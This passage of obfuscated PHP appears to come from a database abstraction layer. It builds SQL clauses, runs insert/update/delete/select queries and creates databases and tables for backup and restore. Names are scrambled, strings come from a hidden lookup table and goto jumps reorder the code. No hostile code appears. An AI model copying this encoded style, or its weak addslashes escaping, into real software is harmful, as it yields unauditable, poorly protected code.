$aãçèĞ‚ˆõ[0]); } } else { $FÔ¬óöùšŠ = count($aãçèĞ‚ˆõ); $Aõ®ˆù”† = $d„Ï„êŠàÒ[33]; if (is_string($aãçèĞ‚ˆõ[$FÔ¬óöùšŠ - 1])) { $Aõ®ˆù”† = isset($aãçèĞ‚ˆõ[$FÔ¬óöùšŠ - 1]) ? strtoupper($aãçèĞ‚ˆõ[$FÔ¬óöùšŠ - 1]) : $d„Ï„êŠàÒ[33]; if (in_array($Aõ®ˆù”†, array($d„Ï„êŠàÒ[910], $d„Ï„êŠàÒ[911], $d„Ï„êŠàÒ[912]))) { $FÔ¬óöùšŠ = $FÔ¬óöùšŠ - 1; } } else { $Aõ®ˆù”† = $d„Ï„êŠàÒ[910]; } for ($CêÔ…³ŠÕŞ = 0; $CêÔ…³ŠÕŞ < $FÔ¬óöùšŠ; $CêÔ…³ŠÕŞ++) { $CÒ·…‡êË‡ = is_array($aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ]) ? $aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ][1] : $aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ]; if ($d„Ï„êŠàÒ[293] == strtolower($aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ][0])) { $B–ÎÉá½åä .= $d„Ï„êŠàÒ[256] . $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $CÒ·…‡êË‡ . $d„Ï„êŠàÒ[927] . $Aõ®ˆù”† . $d„Ï„êŠàÒ[50]; } else { $aÒ‰ßÔ…«ä = is_array($aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ]) ? $this->exp[strtolower($aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ][0])] : $d„Ï„êŠàÒ[903]; if (!$aÒ‰ßÔ…«ä && is_array($aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ]) && in_array($aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ][0], array($d„Ï„êŠàÒ[903], $d„Ï„êŠàÒ[920], $d„Ï„êŠàÒ[921], $d„Ï„êŠàÒ[922], $d„Ï„êŠàÒ[923], $d„Ï„êŠàÒ[924]))) { $aÒ‰ßÔ…«ä = $aãçèĞ‚ˆõ[$CêÔ…³ŠÕŞ][0]; } $B–ÎÉá½åä .= $d„Ï„êŠàÒ[256] . $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $aÒ‰ßÔ…«ä . $d„Ï„êŠàÒ[50] . $this->parseValue($CÒ·…‡êË‡) . $d„Ï„êŠàÒ[927] . $Aõ®ˆù”† . $d„Ï„êŠàÒ[50]; } } $B–ÎÉá½åä = substr($B–ÎÉá½åä, 0, -4); } } else { $B–ÎÉá½åä .= $d ˜®çšÍŒ . $d„Ï„êŠàÒ[931] . $this->parseValue($aãçèĞ‚ˆõ); } return $B–ÎÉá½åä; } protected function parseThinkWhere($e¹À…Ä¼¬“, $CÜÈ¯»ÔÓ) { $bãí…ß¨‡ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DˆßİÓÉÉº = $bãí…ß¨‡ƒ[33]; switch ($e¹À…Ä¼¬“) { case $bãí…ß¨‡ƒ[348]: $DˆßİÓÉÉº = $CÜÈ¯»ÔÓ; break; case $bãí…ß¨‡ƒ[914]: $DˆßİÓÉÉº = is_string($CÜÈ¯»ÔÓ) ? $CÜÈ¯»ÔÓ : substr($this->parseWhere($CÜÈ¯»ÔÓ), 6); break; case $bãí…ß¨‡ƒ[932]: parse_str($CÜÈ¯»ÔÓ, $C„È¿Î½À¦); if (isset($C„È¿Î½À¦[$bãí…ß¨‡ƒ[909]])) { $cİŠ·ÅòÆÌ = $bãí…ß¨‡ƒ[50] . strtoupper($C„È¿Î½À¦[$bãí…ß¨‡ƒ[909]]) . $bãí…ß¨‡ƒ[50]; unset($C„È¿Î½À¦[$bãí…ß¨‡ƒ[909]]); } else { $cİŠ·ÅòÆÌ = $bãí…ß¨‡ƒ[913]; } $aâîºî°´‡ = array(); foreach ($C„È¿Î½À¦ as $dÀìá‘³ => $Eë•‰¢„¯) { $aâîºî°´‡[] = $this->parseKey($dÀìá‘³) . $bãí…ß¨‡ƒ[931] . $this->parseValue($Eë•‰¢„¯); } $DˆßİÓÉÉº = implode($cİŠ·ÅòÆÌ, $aâîºî°´‡); break; } return $DˆßİÓÉÉº; } protected function parseLimit($DÁÛÎºÇĞ) { $bèÜëˆ­­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return !empty($DÁÛÎºÇĞ) ? $bèÜëˆ­­[48] . $DÁÛÎºÇĞ . $bèÜëˆ­­[50] : $bèÜëˆ­­[33]; } protected function parseJoin($c”«ƒéÆ) { $eÈ‹”âÜ“È =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bØ»’¡âõ“ = $eÈ‹”âÜ“È[33]; if (!empty($c”«ƒéÆ)) { if (is_array($c”«ƒéÆ)) { foreach ($c”«ƒéÆ as $A¡»‘„Ç®õ => $f°ğãÌ‹ø×) { if (!1 !== stripos($f°ğãÌ‹ø×, $eÈ‹”âÜ“È[933])) { $bØ»’¡âõ“ .= $eÈ‹”âÜ“È[50] . $f°ğãÌ‹ø×; } else { $bØ»’¡âõ“ .= $eÈ‹”âÜ“È[934] . $f°ğãÌ‹ø×; } } } else { $bØ»’¡âõ“ .= $eÈ‹”âÜ“È[934] . $c”«ƒéÆ; } } $bØ»’¡âõ“ = preg_replace($eÈ‹”âÜ“È[935], think_config($eÈ‹”âÜ“È[841]) . $eÈ‹”âÜ“È[936], $bØ»’¡âõ“); return $bØ»’¡âõ“; } protected function parseOrder($e“è¾Ÿ¢ª¶) { $fÜí† ¡ƒƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_array($e“è¾Ÿ¢ª¶)) { $A‹¸Ù‚ñÉÓ = array(); foreach ($e“è¾Ÿ¢ª¶ as $f°¯–µÆ => $d¥¸®‡›ùĞ) { if (is_numeric($f°¯–µÆ)) { $A‹¸Ù‚ñÉÓ[] = $this->parseKey($d¥¸®‡›ùĞ); } else { $d¥¸®‡›ùĞ = in_array(strtoupper(trim($d¥¸®‡›ùĞ)), array($fÜí† ¡ƒƒ[937], $fÜí† ¡ƒƒ[938])) ? $fÜí† ¡ƒƒ[50] . $d¥¸®‡›ùĞ : $fÜí† ¡ƒƒ[33]; if (preg_match($fÜí† ¡ƒƒ[939], $f°¯–µÆ)) { $A‹¸Ù‚ñÉÓ[] = $this->parseKey($f°¯–µÆ) . $d¥¸®‡›ùĞ; } else { think_exception($fÜí† ¡ƒƒ[940] . $f°¯–µÆ); } } } $e“è¾Ÿ¢ª¶ = implode($fÜí† ¡ƒƒ[47], $A‹¸Ù‚ñÉÓ); } return !empty($e“è¾Ÿ¢ª¶) ? $fÜí† ¡ƒƒ[941] . $e“è¾Ÿ¢ª¶ : $fÜí† ¡ƒƒ[33]; } protected function parseGroup($d¨»„Õ¹È½) { $fİœƒôÄØ§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return !empty($d¨»„Õ¹È½) ? $fİœƒôÄØ§[942] . $d¨»„Õ¹È½ : $fİœƒôÄØ§[33]; } protected function parseHaving($b¬­Ì³æñ) { $aæ¸¼¿©¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return !empty($b¬­Ì³æñ) ? $aæ¸¼¿©¶[943] . $b¬­Ì³æñ : $aæ¸¼¿©¶[33]; } protected function parseComment($Cª”ö™Ò) { $A–±ÏØ‰î· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return !empty($Cª”ö™Ò) ? $A–±ÏØ‰î·[944] . $Cª”ö™Ò . $A–±ÏØ‰î·[945] : $A–±ÏØ‰î·[33]; } protected function parseDistinct($b„¨‡â„Çè) { $bø‰‰“½ºÓ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return !empty($b„¨‡â„Çè) ? $bø‰‰“½ºÓ[946] : $bø‰‰“½ºÓ[33]; } protected function parseUnion($cßÕ™à…Ëç) { $DğÏñº½¼ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($cßÕ™à…Ëç)) { return $DğÏñº½¼ƒ[33]; } if (isset($cßÕ™à…Ëç[$DğÏñº½¼ƒ[344]])) { $Få…ª±İ¡¢ = $DğÏñº½¼ƒ[947]; unset($cßÕ™à…Ëç[$DğÏñº½¼ƒ[344]]); } else { $Få…ª±İ¡¢ = $DğÏñº½¼ƒ[948]; } foreach ($cßÕ™à…Ëç as $d„ˆ–‡Š•¸) { $E«ôÕÄÜ„[] = $Få…ª±İ¡¢ . (is_array($d„ˆ–‡Š•¸) ? $this->buildSelectSql($d„ˆ–‡Š•¸) : $d„ˆ–‡Š•¸); } return implode($DğÏñº½¼ƒ[50], $E«ôÕÄÜ„); } public function insert($e¿µÚí§‹, $A‘Šá°˜ˆĞ = array(), $d”äŒÑƒÅ  = false) { goto a·Ê×ÁŸÛ; a·Ê×ÁŸÛ: $Dà˜ñÅÒˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÀ¸ÆëÆ›• = $fêà†ñŞ¨Ì = array(); $this->model = $A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[277]]; goto DÏƒŞ¹äÈ; DÏƒŞ¹äÈ: foreach ($e¿µÚí§‹ as $CÏÌğ››§å => $a·¢áÑ©Úğ) { if (is_array($a·¢áÑ©Úğ) && $Dà˜ñÅÒˆ[293] == $a·¢áÑ©Úğ[0]) { $fêà†ñŞ¨Ì[] = $this->parseKey($CÏÌğ››§å); $aÀ¸ÆëÆ›•[] = $a·¢áÑ©Úğ[1]; } elseif (is_scalar($a·¢áÑ©Úğ) || is_null($a·¢áÑ©Úğ)) { $fêà†ñŞ¨Ì[] = $this->parseKey($CÏÌğ››§å); $aÀ¸ÆëÆ›•[] = $this->parseValue($a·¢áÑ©Úğ); } } $Cöá¢ĞŒ¤ = ($d”äŒÑƒÅ  ? $Dà˜ñÅÒˆ[819] : $Dà˜ñÅÒˆ[820]) . $Dà˜ñÅÒˆ[821] . $this->parseTable($A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[275]]) . $Dà˜ñÅÒˆ[815] . implode($Dà˜ñÅÒˆ[47], $fêà†ñŞ¨Ì) . $Dà˜ñÅÒˆ[816] . implode($Dà˜ñÅÒˆ[47], $aÀ¸ÆëÆ›•) . $Dà˜ñÅÒˆ[817]; $Cöá¢ĞŒ¤ .= $this->parseLock(isset($A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[767]]) ? $A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[767]] : !1); goto F‰›ØÙ¹£†; F‰›ØÙ¹£†: $Cöá¢ĞŒ¤ .= $this->parseComment(!empty($A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[350]]) ? $A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[350]] : $Dà˜ñÅÒˆ[33]); return $this->execute($Cöá¢ĞŒ¤, $this->parseBind(!empty($A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[281]]) ? $A‘Šá°˜ˆĞ[$Dà˜ñÅÒˆ[281]] : array())); goto eÄ‘Âà“•¥; eÄ‘Âà“•¥: } public function selectInsert($A‡øóíÎ°Ó, $cçôõ·â°Å, $eø–¨šÛó = array()) { goto B—î§áìòÔ; d¾ºœÍ¸¡: return $this->execute($bÅçîÒÀ‘, $this->parseBind(!empty($eø–¨šÛó[$aéá°ñˆô[281]]) ? $eø–¨šÛó[$aéá°ñˆô[281]] : array())); goto e¾ÅÀ¼„É–; F«ÖåÑŒ½¥: array_walk($A‡øóíÎ°Ó, array($this, $aéá°ñˆô[818])); $bÅçîÒÀ‘ = $aéá°ñˆô[949] . $this->parseTable($cçôõ·â°Å) . $aéá°ñˆô[815] . implode($aéá°ñˆô[47], $A‡øóíÎ°Ó) . $aéá°ñˆô[927]; $bÅçîÒÀ‘ .= $this->buildSelectSql($eø–¨šÛó); goto d¾ºœÍ¸¡; B—î§áìòÔ: $aéá°ñˆô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->model = $eø–¨šÛó[$aéá°ñˆô[277]]; if (is_string($A‡øóíÎ°Ó)) { $A‡øóíÎ°Ó = explode($aéá°ñˆô[47], $A‡øóíÎ°Ó); } goto F«ÖåÑŒ½¥; e¾ÅÀ¼„É–: } public function update($E¿‚£ˆÙùê, $d™ƒÏ³ª‚–) { $AÔº¼İ–­á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->model = $d™ƒÏ³ª‚–[$AÔº¼İ–­á[277]]; $f¡¸ŸóÂ£Û = $AÔº¼İ–­á[950] . $this->parseTable($d™ƒÏ³ª‚–[$AÔº¼İ–­á[275]]) . $this->parseSet($E¿‚£ˆÙùê) . $this->parseWhere(!empty($d™ƒÏ³ª‚–[$AÔº¼İ–­á[271]]) ? $d™ƒÏ³ª‚–[$AÔº¼İ–­á[271]] : $AÔº¼İ–­á[33]) . $this->parseOrder(!empty($d™ƒÏ³ª‚–[$AÔº¼İ–­á[359]]) ? $d™ƒÏ³ª‚–[$AÔº¼İ–­á[359]] : $AÔº¼İ–­á[33]) . $this->parseLimit(!empty($d™ƒÏ³ª‚–[$AÔº¼İ–­á[288]]) ? $d™ƒÏ³ª‚–[$AÔº¼İ–­á[288]] : $AÔº¼İ–­á[33]) . $this->parseLock(isset($d™ƒÏ³ª‚–[$AÔº¼İ–­á[767]]) ? $d™ƒÏ³ª‚–[$AÔº¼İ–­á[767]] : !1) . $this->parseComment(!empty($d™ƒÏ³ª‚–[$AÔº¼İ–­á[350]]) ? $d™ƒÏ³ª‚–[$AÔº¼İ–­á[350]] : $AÔº¼İ–­á[33]); return $this->execute($f¡¸ŸóÂ£Û, $this->parseBind(!empty($d™ƒÏ³ª‚–[$AÔº¼İ–­á[281]]) ? $d™ƒÏ³ª‚–[$AÔº¼İ–­á[281]] : array())); } public function delete($A£òÒ²ÏÜ = array()) { $b‘Áš†Â©· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->model = $A£òÒ²ÏÜ[$b‘Áš†Â©·[277]]; $A±Øˆïô© = $b‘Áš†Â©·[951] . $this->parseTable($A£òÒ²ÏÜ[$b‘Áš†Â©·[275]]) . $this->parseWhere(!empty($A£òÒ²ÏÜ[$b‘Áš†Â©·[271]]) ? $A£òÒ²ÏÜ[$b‘Áš†Â©·[271]] : $b‘Áš†Â©·[33]) . $this->parseOrder(!empty($A£òÒ²ÏÜ[$b‘Áš†Â©·[359]]) ? $A£òÒ²ÏÜ[$b‘Áš†Â©·[359]] : $b‘Áš†Â©·[33]) . $this->parseLimit(!empty($A£òÒ²ÏÜ[$b‘Áš†Â©·[288]]) ? $A£òÒ²ÏÜ[$b‘Áš†Â©·[288]] : $b‘Áš†Â©·[33]) . $this->parseLock(isset($A£òÒ²ÏÜ[$b‘Áš†Â©·[767]]) ? $A£òÒ²ÏÜ[$b‘Áš†Â©·[767]] : !1) . $this->parseComment(!empty($A£òÒ²ÏÜ[$b‘Áš†Â©·[350]]) ? $A£òÒ²ÏÜ[$b‘Áš†Â©·[350]] : $b‘Áš†Â©·[33]); return $this->execute($A±Øˆïô©, $this->parseBind(!empty($A£òÒ²ÏÜ[$b‘Áš†Â©·[281]]) ? $A£òÒ²ÏÜ[$b‘Áš†Â©·[281]] : array())); } public function select($cÊ†×šï‹ = array()) { goto f–â¹öÌÎª; E–æÔ»¨ã: $bçöå˜Ã¤à = isset($cÊ†×šï‹[$Cê‡Ø—íî[345]]) ? $cÊ†×šï‹[$Cê‡Ø—íî[345]] : !1; if ($bçöå˜Ã¤à) { $bË¡Ø£÷‚ì = is_string($bçöå˜Ã¤à[$Cê‡Ø—íî[92]]) ? $bçöå˜Ã¤à[$Cê‡Ø—íî[92]] : $Cê‡Ø—íî[952] . md5($FÈé³¤â¾); $Dõ÷•ÀÆ­ = think_cache($bË¡Ø£÷‚ì, $Cê‡Ø—íî[33], $bçöå˜Ã¤à); if (!1 !== $Dõ÷•ÀÆ­) { return $Dõ÷•ÀÆ­; } } $a‘‰­¿Ë¯­ = $this->query($FÈé³¤â¾, $this->parseBind(!empty($cÊ†×šï‹[$Cê‡Ø—íî[281]]) ? $cÊ†×šï‹[$Cê‡Ø—íî[281]] : array())); goto d¨¥‹áĞ”; f–â¹öÌÎª: $Cê‡Ø—íî =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->model = $cÊ†×šï‹[$Cê‡Ø—íî[277]]; $FÈé³¤â¾ = $this->buildSelectSql($cÊ†×šï‹); goto E–æÔ»¨ã; d¨¥‹áĞ”: if ($bçöå˜Ã¤à && !1 !== $a‘‰­¿Ë¯­) { think_cache($bË¡Ø£÷‚ì, $a‘‰­¿Ë¯­, $bçöå˜Ã¤à); } return $a‘‰­¿Ë¯­; goto E Í¼ÙÎŞ; E Í¼ÙÎŞ: } public function buildSelectSql($Aœßªâ  = array()) { goto d¨¨“Ëç²; DõŞë‚Ü¬®: return $Fõèƒé’ê; goto aÒ”«‹óà…; d¨¨“Ëç²: $e™œùá’¦† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($Aœßªâ [$e™œùá’¦†[349]])) { if (strpos($Aœßªâ [$e™œùá’¦†[349]], $e™œùá’¦†[47])) { list($b÷±…È«¤ß, $eá­¶¶ö) = explode($e™œùá’¦†[47], $Aœßªâ [$e™œùá’¦†[349]]); } else { $b÷±…È«¤ß = $Aœßªâ [$e™œùá’¦†[349]]; } $b÷±…È«¤ß = $b÷±…È«¤ß ? $b÷±…È«¤ß : 1; $eá­¶¶ö = isset($eá­¶¶ö) ? $eá­¶¶ö : (is_numeric($Aœßªâ [$e™œùá’¦†[288]]) ? $Aœßªâ [$e™œùá’¦†[288]] : 20); $F…é®æ™ = $eá­¶¶ö * ((int) $b÷±…È«¤ß - 1); $Aœßªâ [$e™œùá’¦†[288]] = $F…é®æ™ . $e™œùá’¦†[47] . $eá­¶¶ö; } if (think_config($e™œùá’¦†[953])) { $bÆßŠÜ³Àì = $e™œùá’¦†[954] . md5(serialize($Aœßªâ )); $F–ªØÜãê¥ = think_cache($bÆßŠÜ³Àì); if ($F–ªØÜãê¥) { return $F–ªØÜãê¥; } } goto b¬Úô¾¨¡ñ; b¬Úô¾¨¡ñ: $Fõèƒé’ê = $this->parseSql($this->selectSql, $Aœßªâ ); $Fõèƒé’ê .= $this->parseLock(isset($Aœßªâ [$e™œùá’¦†[767]]) ? $Aœßªâ [$e™œùá’¦†[767]] : !1); if (isset($bÆßŠÜ³Àì)) { think_cache($bÆßŠÜ³Àì, $Fõèƒé’ê); } goto DõŞë‚Ü¬®; aÒ”«‹óà…: } public function parseSql($B¾ø«îÃè³, $d”ğ·Ÿ—“É = array()) { $E•¯”ã‘ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¾ø«îÃè³ = str_replace(array($E•¯”ã‘ƒ[955], $E•¯”ã‘ƒ[956], $E•¯”ã‘ƒ[957], $E•¯”ã‘ƒ[958], $E•¯”ã‘ƒ[959], $E•¯”ã‘ƒ[960], $E•¯”ã‘ƒ[961], $E•¯”ã‘ƒ[962], $E•¯”ã‘ƒ[963], $E•¯”ã‘ƒ[964], $E•¯”ã‘ƒ[965]), array($this->parseTable("{$d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[275]]}"), $this->parseDistinct(isset($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[966]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[966]] : !1), $this->parseField(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[269]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[269]] : $E•¯”ã‘ƒ[182]), $this->parseJoin(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[278]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[278]] : $E•¯”ã‘ƒ[33]), $this->parseWhere(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[271]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[271]] : $E•¯”ã‘ƒ[33]), $this->parseGroup(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[967]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[967]] : $E•¯”ã‘ƒ[33]), $this->parseHaving(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[968]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[968]] : $E•¯”ã‘ƒ[33]), $this->parseOrder(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[359]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[359]] : $E•¯”ã‘ƒ[33]), $this->parseLimit(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[288]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[288]] : $E•¯”ã‘ƒ[33]), $this->parseUnion(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[343]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[343]] : $E•¯”ã‘ƒ[33]), $this->parseComment(!empty($d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[350]]) ? $d”ğ·Ÿ—“É[$E•¯”ã‘ƒ[350]] : $E•¯”ã‘ƒ[33])), $B¾ø«îÃè³); return $B¾ø«îÃè³; } public function getLastSql($b£Ê¾­Õ  = '') { return $b£Ê¾­Õ  ? $this->modelSql[$b£Ê¾­Õ ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($còÜô™Â½) { return addslashes($còÜô™Â½); } public function setModel($CÆƒ–…“ÌÚ) { $this->model = $CÆƒ–…“ÌÚ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($BÚ¸×»âï¯, $E•¿È”è½„ = '') { $this->database = $BÚ¸×»âï¯; $this->type = $E•¿È”è½„; } public function model($b©Ö–„Æ“„ = '') { return new ModelBase($b©Ö–„Æ“„, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][33], $this->database); } public function db($B«É§Ë¦Ç = false) { goto Fµšµ„“Š; eÕè¾›®ó–: $Fğ–˜²‚ï = $CÓÁè—Â°â[$a™ºøôÕçß[881]]; $CÓÁè—Â°â[$a™ºøôÕçß[881]] = $a™ºøôÕçß[33]; if ($CÓÁè—Â°â[$a™ºøôÕçß[716]] == $a™ºøôÕçß[717]) { $fäÊîñ¸‘ = $CÓÁè—Â°â[$a™ºøôÕçß[718]]; $CÓÁè—Â°â[$a™ºøôÕçß[718]] = substr($fäÊîñ¸‘, 0, strrpos($fäÊîñ¸‘, $a™ºøôÕçß[969])); } goto AÕÉ“¨½‰Œ; Fµšµ„“Š: $a™ºøôÕçß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÓÁè—Â°â = array_change_key_case($this->database); if ($this->type == $a™ºøôÕçß[9] || !$B«É§Ë¦Ç) { return $this->model()->db(); } goto eÕè¾›®ó–; DäõĞöŠğ: $this->database = $CÓÁè—Â°â; $b÷ƒ†Œ’ø->execute("\x75\x73\x65\x20\140{$Fğ–˜²‚ï}\140"); return $b÷ƒ†Œ’ø; goto b¦¦ÎºŞÅ; AÕÉ“¨½‰Œ: $this->database = $CÓÁè—Â°â; $b÷ƒ†Œ’ø = $this->model()->db(); try { $E¤Ûò¬ˆÑÈ = $b÷ƒ†Œ’ø->execute("\x73\150\x6f\167\40\x64\141\164\x61\142\141\x73\145\x73\40\154\151\x6b\x65\40\x27{$Fğ–˜²‚ï}\x27"); } catch (Exception $d§£èÓ¸äÇ) { } goto cŸ“–¬òª; cŸ“–¬òª: if (!$E¤Ûò¬ˆÑÈ) { $b÷ƒ†Œ’ø->execute("\143\162\x65\141\x74\145\x20\144\x61\164\x61\x62\141\163\145\x20\x60{$Fğ–˜²‚ï}\x60"); } $CÓÁè—Â°â[$a™ºøôÕçß[881]] = $Fğ–˜²‚ï; if ($CÓÁè—Â°â[$a™ºøôÕçß[716]] == $a™ºøôÕçß[717]) { $CÓÁè—Â°â[$a™ºøôÕçß[718]] .= $a™ºøôÕçß[969] . $Fğ–˜²‚ï; } goto DäõĞöŠğ; b¦¦ÎºŞÅ: } public function createTable($E·å©êè“, $Aâ¬íÌ‹›ë = null) { $C½…‰¡Ô¨Õ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!IO::exist($E·å©êè“)) { ActionCall($C½…‰¡Ô¨Õ[970], !0, 0); show_json(LNG($C½…‰¡Ô¨Õ[971]), !1); } $D´÷ãÃÍ = sqlSplit(IO::getContent($E·å©êè“)); foreach ($D´÷ãÃÍ as $e“Î»®ª¢•) { if ($Aâ¬íÌ‹›ë) { $b™Í†í±…Ò = stripos($e“Î»®ª¢•, $C½…‰¡Ô¨Õ[972]) === 0; if ($b™Í†í±…Ò) { $Aâ¬íÌ‹›ë->task[$C½…‰¡Ô¨Õ[973]] += 1; } } $this->model()->db()->execute($e“Î»®ª¢•); if ($Aâ¬íÌ‹›ë && $b™Í†í±…Ò) { preg_match($C½…‰¡Ô¨Õ[974], $e“Î»®ª¢•, $AòöĞİŸ¥ê); $Aâ¬íÌ‹›ë->task[$C½…‰¡Ô¨Õ[975]] = $AòöĞİŸ¥ê[1]; $Aâ¬íÌ‹›ë->update(1); } } $this->taskToCache($Aâ¬íÌ‹›ë); } public function insertTable($fÄ‡£Åê, $Cíé›ŞùÀ» = null) { $EñÃ†Şç°• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a·¹˜ÓÛº = $this->model()->db(); $bœ‘ÒÛ¦” = $a÷Ú¤ØÜ¢ô ? array($a÷Ú¤ØÜ¢ô) : $a·¹˜ÓÛº->getTables(); foreach ($fÄ‡£Åê as $Bèƒ¤Õ…¬ï) { $a÷Ú¤ØÜ¢ô = basename($Bèƒ¤Õ…¬ï, $EñÃ†Şç°•[711]); if (!in_array($a÷Ú¤ØÜ¢ô, $bœ‘ÒÛ¦”)) { continue; } if ($Cíé›ŞùÀ») { $Cíé›ŞùÀ»->task[$EñÃ†Şç°•[975]] = $a÷Ú¤ØÜ¢ô; } if (get_filesize($Bèƒ¤Õ…¬ï) == 0) { continue; } $a°Ä¨¹œĞ = $this->sqlToDb($Bèƒ¤Õ…¬ï, $Cíé›ŞùÀ»); if (!$a°Ä¨¹œĞ) { ActionCall($EñÃ†Şç°•[970], !0, 0); show_json(LNG($EñÃ†Şç°•[976]) . "\133{$a÷Ú¤ØÜ¢ô}\135", !1); } } $this->taskToCache($Cíé›ŞùÀ»); } public function sqlFromDb($AÄ÷ì«âÍ¥, $e“Şª…¢Ä, $BÒ‡˜…ø³» = null, $A’£—Š‘à¹ = null) { goto bÑ†Æ‘‰Ì; C¥Á½™ôÇ¨: $CÄ‹Û÷ê÷“ = $B™²Á–Ù->getPk(); $Eƒ„à…®¶¦ = $B™²Á–Ù->getDbFields(); do { $cĞ¿½§òë‰ = $B™²Á–Ù->field($Eƒ„à…®¶¦)->order($CÄ‹Û÷ê÷“ . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][978])->selectPage($c¶Ÿ‹ÈŞ·¯, $cãò—“Ø…Ö); $B³‹ªâ¶‚ = isset($cĞ¿½§òë‰[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][360]][$_SERVER[ó¬â¥‰ÊÔ¤Ç£][362]]) ? $cĞ¿½§òë‰[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][360]][$_SERVER[ó¬â¥‰ÊÔ¤Ç£][362]] : 0; $aßâõ›ƒ = !empty($cĞ¿½§òë‰[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][363]]) ? $cĞ¿½§òë‰[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][363]] : array(); if (!($a²‹†æ« = count($aßâõ›ƒ))) { break; } $aˆ¶›™¬Ô× = array(); foreach ($aßâõ›ƒ as $B–Ÿ‹ÔµØÇ) { if ($AÄ÷ì«âÍ¥ == $_SERVER[ó¬â¥‰ÊÔ¤Ç£][979] && $B–Ÿ‹ÔµØÇ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][29]] == $_SERVER[ó¬â¥‰ÊÔ¤Ç£][980]) { $BóÚš…’×Ì = json_decode($B–Ÿ‹ÔµØÇ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][368]], !0); if ($BóÚš…’×Ì[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]] == date($_SERVER[ó¬â¥‰ÊÔ¤Ç£][684]) && !$BóÚš…’×Ì[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][683]]) { continue; } } if ($A’£—Š‘à¹) { $B–Ÿ‹ÔµØÇ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]] = "\x7b\151\157\72{$A’£—Š‘à¹}\x7d" . substr($B–Ÿ‹ÔµØÇ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]], strlen("\173\151\157\x3a{$B–Ÿ‹ÔµØÇ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][737]]}\175")); $B–Ÿ‹ÔµØÇ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][737]] = $A’£—Š‘à¹; } $aˆ¶›™¬Ô×[] = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][981] . $this->sqlEncode($B–Ÿ‹ÔµØÇ) . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][982]; } $döà¿¼¯¿ç = "\x49\116\x53\105\122\x54\40\x49\116\124\117\x20\140{$AÄ÷ì«âÍ¥}\140\40\x28\140" . 